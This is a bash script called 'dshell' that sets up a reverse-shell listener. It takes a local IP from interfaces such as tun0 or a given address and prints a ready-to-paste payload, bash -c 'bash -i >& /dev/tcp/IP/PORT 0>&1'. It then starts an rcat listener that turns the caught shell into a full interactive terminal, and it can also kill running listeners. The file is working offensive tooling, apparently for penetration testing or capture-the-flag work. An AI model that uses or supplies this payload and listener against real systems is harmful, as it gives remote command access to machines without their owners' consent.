#!/bin/bash

PURPLE="\033[1;35m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW_ORANGE="\033[1;38;5;214m"
LIGHTER_BLUE="\033[1;38;5;117m"
YELLOW_BOLD="\033[1m\033[33m"
RESET="\033[0m"

usage() {
    echo ""
    echo -e "${PURPLE}[${GREEN}Info${PURPLE}]${RESET} Usage:"
    echo -e "        dshell -p <PORT> [IFACE|IP]"
    echo -e "        dshell -k <PORT|all>"
    exit 1
}

cleanup() {
    stty sane
    reset >/dev/null 2>&1 || true
}
trap cleanup EXIT

kill_rcat() {
    target="$1"
    if [ -z "$target" ]; then
        echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} No argument for -k. Use a port number or 'all'."
        usage
    fi

    if [ "$target" = "all" ]; then
        pids=$(ps -eo pid,cmd | grep '[r]cat' | awk '{print $1}')
        if [ -z "$pids" ]; then
            echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} No dshell processes found."
            return
        fi
        for pid in $pids; do
            cmdline=$(ps -p "$pid" -o args=)
            port=$(echo "$cmdline" | awk '{print $NF}')
            if [[ "$port" =~ ^[0-9]+$ ]]; then
                echo -e "${PURPLE}[${GREEN}Info${PURPLE}]${RESET} Killing dshell port ${port}"
            else
                echo -e "${PURPLE}[${GREEN}Info${PURPLE}]${RESET} Killing dshell port (unknown)"
            fi
            kill -9 "$pid" 2>/dev/null || echo -e "${PURPLE}[${RED}Error${PURPLE}]${RESET} Failed to kill PID $pid"
        done
        return
    fi

    pids=$(ps -eo pid,cmd | grep '[r]cat' | grep -w -- "$target" | awk '{print $1}')
    if [ -z "$pids" ]; then
        echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} No dshell process found for port ${target}."
        return
    fi
    for pid in $pids; do
        echo -e "${PURPLE}[${GREEN}Info${PURPLE}]${RESET} Killing dshell port ${target}"
        kill -9 "$pid" 2>/dev/null || echo -e "${PURPLE}[${RED}Error${PURPLE}]${RESET} Failed to kill PID $pid"
    done
}

port_in_use() {
    port="$1"
    existing=$(ps -eo pid,cmd | grep '[r]cat' | grep -w -- "$port")
    [ -n "$existing" ]
}

get_ip_for_iface() {
    iface="$1"
    ip_addr=""

    if command -v ip >/dev/null 2>&1; then
        ip_addr=$(ip -o -4 addr show dev "$iface" 2>/dev/null | awk '{print $4}' | cut -d'/' -f1 | head -n1)
    fi
    if [ -z "$ip_addr" ] && command -v ifconfig >/dev/null 2>&1; then
        ip_addr=$(ifconfig "$iface" 2>/dev/null | awk '/inet /{print $2; exit}')
        [ -z "$ip_addr" ] && ip_addr=$(ifconfig "$iface" 2>/dev/null | sed -n 's/.*inet addr:\([0-9.]*\).*/\1/p' | head -n1)
    fi
    echo "$ip_addr"
}

print_with_leading_spaces() {
    n="$1"
    shift
    s="$*"
    if [ "$n" -le 0 ]; then
        printf "%b\n" "$s"
    else
        printf "%*s%b\n" "$n" "" "$s"
    fi
}

is_valid_ip() {
    local ip="$1"
    if [[ ! "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 1
    fi

    IFS='.' read -r -a octets <<< "$ip"
    for octet in "${octets[@]}"; do
        if [ "$octet" -lt 0 ] || [ "$octet" -gt 255 ]; then
            return 1
        fi
    done

    return 0
}

if [ $# -lt 1 ]; then
    usage
fi

case "$1" in
    -k)
        [ -z "$2" ] && { echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} -k requires an argument."; usage; }
        kill_rcat "$2"
        exit 0
        ;;
    -p)
        [ -z "$2" ] && { echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} -p requires a port number."; usage; }
        port="$2"
        supplied_arg="$3"
        
        ip_for_iface=""
        iface=""

        if [ -n "$supplied_arg" ] && is_valid_ip "$supplied_arg"; then
            ip_for_iface="$supplied_arg"
            iface="IP"
        elif [ -n "$supplied_arg" ]; then
            iface="$supplied_arg"
        else
            for candidate in tun1 tun0 wlan0 eth0 lo; do
                iptmp=$(get_ip_for_iface "$candidate")
                if [ -n "$iptmp" ]; then
                    iface="$candidate"
                    break
                fi
            done
        fi
        
        if port_in_use "$port"; then
            echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} dshell already running on port ${port}. Aborting."
            exit 1
        fi
        
        printf "\n"

        if [ -z "$ip_for_iface" ] && [ -n "$iface" ]; then
            ip_for_iface=$(get_ip_for_iface "$iface")
            if [ -z "$ip_for_iface" ]; then
                echo -e "${PURPLE}[${RED}Warning${PURPLE}]${RESET} No IP found for the supplied interface: ${iface}."
                printf "\n"
            fi
        fi

        if [ -n "$ip_for_iface" ]; then
            payload_plain="[Shell] bash -c 'bash -i >& /dev/tcp/${ip_for_iface}/${port} 0>&1' [Shell]"

            payload_colored="${PURPLE}[${YELLOW_ORANGE}Shell${PURPLE}] ${LIGHTER_BLUE}bash -c 'bash -i >& /dev/tcp/${ip_for_iface}/${port} 0>&1' ${PURPLE}[${YELLOW_ORANGE}Shell${PURPLE}]${RESET}"

            payload_len=${#payload_plain}

            cols=$(stty size 2>/dev/null | awk '{print $2}')
            [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
            [ -z "$cols" ] && cols=80

            cols=$((cols / 2))
            cols=$((cols - 10))

            payload_start_col=$(( (cols - payload_len) / 2 ))
            if [ "$payload_start_col" -lt 0 ]; then payload_start_col=0; fi

            iface_line="[$iface]"
            iface_len=${#iface_line}
            iface_start_col=$(( payload_len / 2 - iface_len ))
            if [ "$iface_start_col" -lt 0 ]; then iface_start_col=0; fi

            iface_print_col=$(( payload_start_col + iface_start_col ))
            if [ "$iface_print_col" -lt 0 ]; then iface_print_col=0; fi

            colored_iface="${PURPLE}[${YELLOW_BOLD}${iface}${PURPLE}]${RESET}"
            
            print_with_leading_spaces "$iface_print_col" "$colored_iface"
            printf "%b\n\n" "$payload_colored"

            printf "\n"
        fi

        stty raw -echo

        terminal_size=$(stty size)

        command=(rcat l -ie "script -qc /bin/bash /dev/null" "$port")
        "${command[@]}"

        reset
        exit 0
        ;;
    *)
        usage
        ;;
esac
